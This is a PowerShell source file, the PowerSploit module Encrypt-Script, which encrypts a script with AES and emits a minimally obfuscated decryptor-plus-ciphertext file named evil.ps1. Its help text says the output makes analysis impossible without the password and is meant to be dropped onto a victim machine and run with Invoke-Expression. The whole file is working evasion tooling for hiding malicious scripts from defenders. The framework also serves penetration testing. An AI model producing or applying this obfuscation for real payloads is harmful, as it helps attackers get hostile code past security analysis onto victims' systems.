function Encrypt-Script {

<#
.Synopsis

 PowerSploit Module - Encrypt-Script
 Author: Matthew Graeber (@mattifestation)
 License: BSD 3-Clause
 
.Description

 Encrypt-Script will encrypt a script (or any text file for that matter)
 and output the results to a minimally obfuscated script - evil.ps1.
 
.Parameter ScriptPath

 Path to this script
 
.Parameter Password

 Password to encrypt/decrypt the script
 
.Parameter Salt

 Salt value for encryption/decryption. This can be any string value.
 
.Example

 PS> Encrypt-Script .\Naughty-Script.ps1 password salty
 
 Description
 -----------
 Encrypt the contents of this file with a password and salt. This will make analysis of the
 script impossible without the correct password and salt combination. This command will
 generate evil.ps1 that can dropped onto the victim machine. It only consists of a
 decryption function 'de' and the base64-encoded ciphertext.

 Note: This command can be used to encrypt any text-based file/script
.Example
 C:\PS>[String] $cmd = Get-Content .\evil.ps1
 C:\PS>Invoke-Expression $cmd
 C:\PS>$decrypted = de password salt
 C:\PS>Invoke-Expression $decrypted
 
.Link

 My blog: http://www.exploit-monday.com
#>

Param (
    [Parameter(Position = 0, Mandatory = $True)] [String] $ScriptPath,
    [Parameter(Position = 1, Mandatory = $True)] [String] $Password,
    [Parameter(Position = 2, Mandatory = $True)] [String] $Salt
)

$AsciiEncoder = New-Object System.Text.ASCIIEncoding
$ivBytes = $AsciiEncoder.GetBytes("CRACKMEIFYOUCAN!")
# While this can be used to encrypt any file, it's primarily designed to encrypt itself.
[Byte[]] $scriptBytes = Get-Content -Encoding byte -Path $ScriptPath
$DerivedPass = New-Object System.Security.Cryptography.PasswordDeriveBytes($Password, $AsciiEncoder.GetBytes($Salt), "SHA1", 2)
$Key = New-Object System.Security.Cryptography.RijndaelManaged
$Key.Mode = [System.Security.Cryptography.CipherMode]::CBC
[Byte[]] $KeyBytes = $DerivedPass.GetBytes(32)
$Encryptor = $Key.CreateEncryptor($KeyBytes, $ivBytes)
$MemStream = New-Object System.IO.MemoryStream
$CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemStream, $Encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
$CryptoStream.Write($scriptBytes, 0, $scriptBytes.Length)
$CryptoStream.FlushFinalBlock()
$CipherTextBytes = $MemStream.ToArray()
$MemStream.Close()
$CryptoStream.Close()
$Key.Clear()
$Cipher = [Convert]::ToBase64String($CipherTextBytes)

# Generate encrypted PS1 file. All that will be included is the base64-encoded ciphertext and a slightly 'obfuscated' decrypt function
$Output = 'function de([String] $b, [String] $c)
{
$a = "'
$Output += $cipher
$Output += '"'
$Output += ';
$encoding = New-Object System.Text.ASCIIEncoding;
$dd = $encoding.GetBytes("CRACKMEIFYOUCAN!");
$aa = [Convert]::FromBase64String($a);
$derivedPass = New-Object System.Security.Cryptography.PasswordDeriveBytes($b, $encoding.GetBytes($c), "SHA1", 2);
[Byte[]] $e = $derivedPass.GetBytes(32);
$f = New-Object System.Security.Cryptography.RijndaelManaged;
$f.Mode = [System.Security.Cryptography.CipherMode]::CBC;
[Byte[]] $h = New-Object Byte[]($aa.Length);
$g = $f.CreateDecryptor($e, $dd);
$i = New-Object System.IO.MemoryStream($aa, $True);
$j = New-Object System.Security.Cryptography.CryptoStream($i, $g, [System.Security.Cryptography.CryptoStreamMode]::Read);
$r = $j.Read($h, 0, $h.Length);
$i.Close();
$j.Close();
$f.Clear();
return $encoding.GetString($h,0,$h.Length);
}'

# Output decrypt function and ciphertext to evil.ps1
Out-File -InputObject $Output -Encoding ASCII .\evil.ps1

Write-Host "Encrypted PS1 file saved to: $(Resolve-Path .\evil.ps1)"

}
